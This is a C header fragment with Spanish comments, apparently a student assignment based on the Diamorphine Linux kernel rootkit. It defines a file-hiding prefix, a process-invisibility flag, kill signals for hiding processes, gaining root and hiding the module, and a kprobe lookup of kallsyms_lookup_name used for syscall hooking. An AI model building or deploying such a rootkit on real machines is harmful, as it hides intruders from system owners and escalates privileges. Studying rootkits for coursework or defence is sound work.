//Se define la estructura para representar la entradas de un directorio en Linux
struct linux_dirent {
        unsigned long   d_ino; //i-node
        unsigned long   d_off; //Proximo directorio/archivo
        unsigned short  d_reclen; //Longitud del directorioo
        char            d_name[1]; //Arreglo del nombre del directorio
};

#define MAGIC_PREFIX "Tarea3" //Prefijo utilizado para buscar archivos

#define PF_INVISIBLE 0x10000000

#define MODULE_NAME "diamorphine" //Nombre del modulo

//Se define enumerado para las senales enviadas al comando kill
enum {
	SIGINVIS = 31, 
	SIGSUPER = 64,
	SIGMODINVIS = 63,
};

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
#endif

//Se define para versiones de kernel mayores o iguales a 5.7.0
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
//Se define el uso de los Kernel Probes sobre la funcion kallsyms_lookup_name para buscar las llamadas del sistema
#include <linux/kprobes.h>
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};
#endif
